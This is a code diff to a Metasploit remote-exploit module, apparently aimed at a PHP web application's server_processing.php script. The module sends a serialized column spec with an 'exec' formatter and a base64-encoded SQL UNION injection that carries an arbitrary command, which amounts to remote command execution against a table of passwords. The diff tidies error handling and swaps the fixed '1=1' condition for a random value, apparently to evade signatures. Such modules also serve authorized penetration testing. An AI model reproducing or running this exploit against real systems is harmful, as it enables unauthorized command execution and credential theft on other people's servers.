@@ -85,15 +85,10 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def parse_response(js)
-    if js
-      json = {}
-      begin
-        json = JSON.parse(sanitize_json(js.body))
-        return "#{json['data'][0]['username']}"
-      rescue JSON::ParserError
-      end
-    end
-
+    return false unless js
+    json = JSON.parse(sanitize_json(js.body))
+    return "#{json['data'][0]['username']}"
+  rescue
     return false
   end
 
@@ -104,6 +99,7 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def execute_command(command)
+    junk = rand(1_000)
     response = send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', 'server_processing.php'),
@@ -112,7 +108,7 @@ class MetasploitModule < Msf::Exploit::Remote
         'table' => 'passwords',
         'primary' => 'password_id',
         'clmns' => 'a:1:{i:0;a:3:{s:2:"db";s:3:"pwd";s:2:"dt";s:8:"username";s:9:"formatter";s:4:"exec";}}',
-        'where' => Rex::Text.encode_base64("1=1 UNION SELECT \"#{command}\"")
+        'where' => Rex::Text.encode_base64("#{junk}=#{junk} UNION SELECT \"#{command}\"")
       }
     )
     if (response) && (response.body)
